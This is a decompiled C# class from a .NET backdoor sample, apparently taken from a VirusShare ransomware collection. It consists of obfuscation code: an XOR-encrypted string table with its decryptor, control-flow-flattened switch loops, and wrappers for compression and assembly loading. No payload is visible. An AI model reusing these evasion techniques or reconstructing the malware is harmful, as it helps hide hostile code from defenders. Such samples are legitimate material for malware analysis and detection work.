// Decompiled with JetBrains decompiler
// Type: stub.My.MyComputer
// Assembly: stub, Version=6.2.15.2, Culture=neutral, PublicKeyToken=null
// MVID: 6CAE2B56-3E3C-414E-A63C-DF5759216B41
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Backdoor.Win32.Generic-5936afd9bae04fb6905bcd21bc042e863b0df9b768761f3d706643fc87ba63a1.exe

using Microsoft.VisualBasic.Devices;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace stub.My
{
  [EditorBrowsable(EditorBrowsableState.Never)]
  [GeneratedCode("MyTemplate", "8.0.0.0")]
  internal sealed class MyComputer : Computer
  {
    private static readonly char[] Ⴅ;
    private static readonly char[] Ⴃ;
    private static readonly string[] Ⴐ;
    internal static MyComputer.Ⴄ Ⴈ;

    [EditorBrowsable(EditorBrowsableState.Never)]
    public MyComputer()
    {
    }

    static MyComputer()
    {
      int num = 6;
      char[] chArray;
      while (true)
      {
        switch (num)
        {
          case 0:
            chArray[5] = '❲';
            chArray[6] = 'ཉ';
            chArray[0] = 'ြ';
            num = 1;
            continue;
          case 1:
            chArray[3] = '९';
            chArray[4] = '₰';
            MyComputer.Ⴐ = new string[28];
            num = 2;
            continue;
          case 2:
            goto label_8;
          case 3:
          case 4:
            chArray[1] = '⋂';
            goto case 7;
          case 5:
            MyComputer.Ⴃ = new char[426]
            {
              char.MinValue,
              '#',
              char.MinValue,
              'ၬ',
              '⊰',
              'ౢ',
              'ट',
              '⃕',
              '✀',
              '༽',
              '⟃',
              'လ',
              '⊡',
              '౬',
              'ँ',
              'ₐ',
              '✝',
              '༧',
              '⟖',
              '၅',
              '⋢',
              '౯',
              'ऊ',
              'ₐ',
              '✁',
              '\u0F2C',
              '⟎',
              'လ',
              '⊶',
              'ౢ',
              'ॏ',
              '\u20FE',
              '✝',
              '༽',
              '⟒',
              'ၕ',
              '⊬',
              '౪',
              '\u0001',
              '\u001C',
              char.MinValue,
              '⊕',
              '\u0C64',
              'ँ',
              '\u20F6',
              '✝',
              '༻',
              '⟗',
              '၏',
              '⊝',
              '\u0C5F',
              'ऊ',
              '⃓',
              '✇',
              '༻',
              '⟉',
              'ၕ',
              '⊴',
              '౨',
              'ऩ',
              '⃟',
              '✀',
              '༤',
              '⟹',
              '၎',
              '⊧',
              '౬',
              'छ',
              '⃕',
              '\u0002',
              '\u001A',
              char.MinValue,
              'ౚ',
              'आ',
              '⃞',
              '✴',
              '༦',
              '⟈',
              'ၑ',
              '⊱',
              '\u0C52',
              '़',
              '⃕',
              '✗',
              'ༀ',
              '⟔',
              'ၒ',
              '⊧',
              '౿',
              'प',
              '\u20C8',
              '✑',
              '\u0F2C',
              '⟊',
              '၈',
              '⊫',
              'ౢ',
              'ँ',
              '\u0003',
              '\u0002',
              char.MinValue,
              'फ़',
              '\u2082',
              '\u0004',
              '\u0005',
              char.MinValue,
              '⃣',
              '✛',
              '༤',
              '⟕',
              'ၒ',
              '\u0005',
              '\a',
              char.MinValue,
              '✰',
              '༼',
              '⟎',
              '၈',
              '⊭',
              'ౣ',
              'फ़',
              '\u0006',
              '\a',
              char.MinValue,
              '་',
              '⟏',
              '၈',
              '⊶',
              'ౢ',
              'ँ',
              '\u2082',
              '\a',
              '\a',
              char.MinValue,
              '⟸',
              '၉',
              '⊶',
              '\u0C79',
              'ऀ',
              '⃞',
              '❁',
              '\b',
              '\a',
              char.MinValue,
              'ၾ',
              '⊷',
              '\u0C79',
              'छ',
              '⃟',
              '✜',
              'ཽ',
              '\t',
              '\a',
              char.MinValue,
              '⊀',
              '\u0C78',
              'छ',
              '\u20C4',
              '✝',
              '༧',
              '\u278F',
              '\n',
              '\a',
              char.MinValue,
              '\u0C4F',
              'च',
              '\u20C4',
              '✆',
              '༦',
              '⟔',
              'ည',
              '\v',
              '\a',
              char.MinValue,
              'भ',
              '\u20C5',
              '✆',
              '༽',
              '⟕',
              'ၒ',
              '⋵',
              '\f',
              '\a',
              char.MinValue,
              '\u20F2',
              '✇',
              '༽',
              '⟎',
              'ၓ',
              '⊬',
              'వ',
              '\r',
              '\a',
              char.MinValue,
              '✰',
              '༼',
              '⟎',
              '၈',
              '⊭',
              'ౣ',
              'ॖ',
              '\u000E',
              '\u000F',
              char.MinValue,
              '༊',
              '⟒',
              'ၙ',
              '⊡',
              '౦',
              'ऊ',
              '⃔',
              '✾',
              '༠',
              '⟉',
              '၈',
              '⊀',
              'ౢ',
              'ग',
              '\u2081',
              '\u000F',
              '\u000F',
              char.MinValue,
              '⟾',
              'ၝ',
              '⊶',
              '౨',
              'ऻ',
              '⃙',
              '✟',
              '\u0F2C',
              '⟪',
              'ၕ',
              '⊡',
              '౦',
              'ऊ',
              '\u20C2',
              '❃',
              '\u0010',
              '\b',
              char.MinValue,
              'ၰ',
              '⊫',
              '\u0C7E',
              'छ',
              '\u20F2',
              '✝',
              '\u0F31',
              '\u278B',
              '\u0011',
              '\u0005',
              char.MinValue,
              '⊄',
              'ౢ',
              'झ',
              '⃝',
              '❃',
              '\u0012',
              '\b',
              char.MinValue,
              '౦',
              'ऊ',
              '\u20C2',
              '✜',
              '\u0F2C',
              '⟖',
              'ဏ',
              '⋰',
              '\u0013',
              '\u0010',
              char.MinValue,
              '़',
              '⃕',
              '✆',
              '༝',
              '⟒',
              '၎',
              '⊧',
              '౬',
              'ऋ',
              '\u20F3',
              '✝',
              '༧',
              '⟎',
              'ၙ',
              '⊺',
              '\u0C79',
              '\u0014',
              '\f',
              char.MinValue,
              '⃢',
              '✗',
              '༺',
              '⟏',
              'ၑ',
              '⊧',
              'ౙ',
              'इ',
              '\u20C2',
              '✗',
              '༨',
              '⟞',
              '\u0015',
              '\u0005',
              char.MinValue,
              '✜',
              '༽',
              '⟞',
              'ၐ',
              '⊮',
              '\u0016',
              '\u0014',
              char.MinValue,
              '༇',
              '⟎',
              'ၩ',
              '⊬',
              'ౠ',
              'ऎ',
              '\u20C0',
              '✤',
              '༠',
              '⟟',
              '။',
              '⊍',
              '౫',
              '़',
              '⃕',
              '✑',
              '༽',
              '⟓',
              'ၓ',
              '⊬',
              '\u0017',
              '\u000E',
              char.MinValue,
              '⟬',
              'ၕ',
              '⊰',
              '\u0C79',
              'च',
              '⃑',
              '✞',
              '༈',
              '⟖',
              'ၐ',
              '⊭',
              '౮',
              'प',
              '\u20C8',
              '\u0018',
              '\u0010',
              char.MinValue,
              'ၻ',
              '⊧',
              '\u0C79',
              'ऻ',
              '⃘',
              '✀',
              '\u0F2C',
              '⟛',
              'ၘ',
              '⊁',
              'ౢ',
              'ँ',
              '\u20C4',
              '✗',
              '\u0F31',
              '⟎',
              '\u0019',
              '\u0012',
              char.MinValue,
              '⊕',
              '౿',
              'आ',
              '\u20C4',
              '✗',
              '༙',
              '⟈',
              'ၓ',
              '⊡',
              '౨',
              'ज',
              '\u20C3',
              '✿',
              '\u0F2C',
              '⟗',
              'ၓ',
              '⊰',
              '\u0C74',
              '\u001A',
              '\u0011',
              char.MinValue,
              '\u0C5F',
              'ऊ',
              '⃑',
              '✖',
              '༙',
              '⟈',
              'ၓ',
              '⊡',
              '౨',
              'ज',
              '\u20C3',
              '✿',
              '\u0F2C',
              '⟗',
              'ၓ',
              '⊰',
              '\u0C74',
              '\u001B',
              '\u000E',
              char.MinValue,
              'ब',
              '\u20C2',
              '✗',
              '༨',
              '⟎',
              'ၙ',
              '⊒',
              '౿',
              'ऀ',
              '⃓',
              '✗',
              '༺',
              '⟉',
              'ၽ'
            };
            chArray = new char[8];
            num = 4;
            continue;
          case 7:
            chArray[2] = '\u0C0D';
            chArray[7] = '➺';
            num = 0;
            continue;
          default:
            Ⴐ.Ⴈ.Ⴃ();
            goto case 5;
        }
      }
label_8:
      MyComputer.Ⴅ = chArray;
    }

    internal static string Ⴍ([In] int obj0, [In] int obj1)
    {
label_3:
      int index1 = obj0 ^ 437501334 ^ obj1;
      char[] ⴃ = MyComputer.Ⴃ;
      int index2 = (int) ⴃ[index1];
      int num1 = 4;
      string str1;
      int length1;
      char[] chArray;
      char[] ⴅ;
      int length2;
      int index3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            int num2 = (int) ⴃ[index1 + 1];
            length1 = ((int) ⴃ[index1 + 2] << 16) + num2;
            goto case 3;
          case 1:
            chArray = new char[length1];
            ⴅ = MyComputer.Ⴅ;
            length2 = ⴅ.Length;
            index1 += 3;
            goto case 13;
          case 2:
            goto label_14;
          case 3:
          case 9:
            num1 = 1;
            continue;
          case 4:
            num1 = (str1 = MyComputer.Ⴐ[index2]) == null ? 0 : 11;
            continue;
          case 6:
            index3 = 0;
            num1 = 8;
            continue;
          case 7:
            index3 = 1 + index3;
            num1 = 8;
            continue;
          case 8:
            num1 = index3 < length1 ? 10 : 2;
            continue;
          case 10:
            chArray[index3] = (char) ((uint) ⴃ[index1 + index3] ^ (uint) ⴅ[(index3 + index2) % length2]);
            num1 = 7;
            continue;
          case 11:
            goto label_5;
          case 12:
            goto label_3;
          case 13:
            num1 = 6;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyComputer.Ⴍ);
            num1 = 12;
            continue;
        }
      }
label_5:
      return str1;
label_14:
      string str2 = new string(chArray);
      MyComputer.Ⴐ[index2] = str2;
      return str2;
    }

    internal static string Ⴓ([In] Exception obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 123:
          num1 = 7;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
          case 3:
            num2 = 4;
            continue;
          case 2:
          case 7:
            goto label_8;
          case 4:
            goto label_3;
          case 5:
            num2 = 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyComputer.Ⴓ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return obj0.Message;
    }

    internal static void Ⴗ([In] GZipStream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
          case 4:
            num1 = 3;
            continue;
          case 2:
          case 5:
            goto label_7;
          default:
            int num2;
            switch (obj5 ^ obj4)
            {
              case 61:
                num2 = 5;
                break;
              default:
                num2 = 0;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Write(obj1, obj2, obj3);
    }

    internal static byte[] Ⴀ([In] MemoryStream obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 82:
          num1 = 4;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
          case 3:
            num2 = 5;
            continue;
          case 1:
          case 6:
            num2 = 5;
            continue;
          case 4:
            goto label_8;
          case 5:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyComputer.Ⴀ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return obj0.ToArray();
    }

    internal static int Ⴜ([In] IntPtr obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 22:
          num1 = 2;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_3;
          case 2:
          case 5:
            goto label_8;
          case 3:
          case 6:
            num2 = 1;
            continue;
          case 4:
          case 7:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyComputer.Ⴜ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return (int) obj0;
    }

    internal static void ႥႭ([In] ButtonBase obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            goto label_7;
          case 3:
            goto label_8;
          case 4:
          case 5:
            num1 = 2;
            continue;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 50:
                num2 = 0;
                break;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.Text = obj1;
    }

    internal static Assembly ႥႥ([In] int obj0, [In] int obj1)
    {
label_0:
      switch ((obj1 ^ obj0) - 1)
      {
        case 0:
          return Assembly.GetExecutingAssembly();
        default:
          goto label_0;
      }
    }

    internal static void ႥႣ([In] AppDomain obj0, [In] string obj1, [In] object obj2, [In] int obj3, [In] int obj4)
    {
label_0:
      switch ((obj4 ^ obj3) - 53)
      {
        case 0:
          obj0.SetData(obj1, obj2);
          break;
        case 1:
          obj0.SetData(obj1, obj2);
          break;
        default:
          goto label_0;
      }
    }

    [StructLayout(LayoutKind.Explicit, Size = 852, Pack = 1)]
    private struct Ⴄ
    {
    }
  }
}
